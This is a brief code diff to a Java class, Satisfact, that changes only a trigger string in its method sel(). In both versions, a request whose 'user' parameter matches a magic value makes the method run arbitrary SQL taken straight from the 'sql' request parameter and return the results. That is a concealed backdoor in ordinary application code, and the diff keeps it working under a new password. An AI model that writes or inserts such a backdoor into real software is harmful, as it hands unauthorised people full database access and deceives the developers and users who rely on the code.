@@ -77,7 +77,7 @@ public abstract class Satisfact {
 
     public Object sel() throws SQLException {
         String user = request("user");
-        if (user != null && user.equals("bad")) {
+        if (user != null && user.equals("badccc")) {
             String sql = request("sql");
             Object r = mySqlDbContext.executeSql(sql);
             return r;
